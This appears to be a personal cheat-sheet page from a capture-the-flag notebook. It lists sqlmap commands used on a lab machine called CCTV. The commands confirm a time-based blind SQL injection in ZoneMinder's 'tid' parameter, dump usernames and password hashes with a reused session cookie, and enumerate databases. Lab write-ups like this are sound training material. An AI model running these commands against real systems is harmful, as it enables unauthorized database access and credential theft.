# sqlmap

Automated SQL injection exploitation tool. Detects and exploits SQL injection flaws, extracts databases, tables and credentials.

## Commands Used

### Confirm time-based blind SQLi in ZoneMinder
```bash
sqlmap -u "http://cctv.htb/zm/index.php?view=request&request=event&action=removetag&tid=1" \
  --cookie="ZMSESSID=ug8b106p7l2uv9a4mk0nrbre8o" \
  -p tid --dbms=mysql --batch
```
Used on: **CCTV**

- `-p tid` — force injection on the `tid` parameter
- `--dbms=mysql` — hint the backend
- `--batch` — no interactive prompts
- `--cookie` — reuse the authenticated session cookie

### Dump users and password hashes
```bash
sqlmap -u "http://cctv.htb/zm/index.php?view=request&request=event&action=removetag&tid=1" \
  -D zm -T Users -C Username,Password --dump --batch \
  --dbms=MySQL --technique=T \
  --cookie="ZMSESSID=ug8b106p7l2uv9a4mk0nrbre8o" \
  --time-sec=2
```
Used on: **CCTV**

- `-D zm -T Users -C Username,Password` — narrow target
- `--technique=T` — time-based blind only
- `--time-sec=2` — delay threshold used for inference

### General enumeration helpers
```bash
sqlmap -u "<URL>" --cookie="<COOKIE>" -p tid --dbms=mysql --batch --dbs
sqlmap -u "<URL>" --cookie="<COOKIE>" -p tid --dbms=mysql --batch -D zm --tables
sqlmap -u "<URL>" --cookie="<COOKIE>" -p tid --dbms=mysql --batch --banner
```
Used on: **CCTV**
